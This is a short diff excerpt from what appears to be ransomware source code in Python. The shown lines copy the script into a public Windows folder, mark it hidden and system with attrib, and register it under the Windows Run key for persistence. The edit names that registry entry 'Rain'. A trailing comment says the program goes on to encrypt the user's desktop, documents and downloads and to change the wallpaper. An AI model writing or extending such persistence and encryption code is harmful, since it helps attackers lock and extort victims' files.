@@ -357,7 +357,7 @@ dst = r'C:\Users\Public\{}'.format(__file__)
 copyfile(__file__, dst)
 system('attrib +s +h {}'.format(dst))
 
-crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst + '"')
+crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst + '"', 'Rain')
 
 # Encrypt user's desktop, documents, downloads and change the desktop background
 
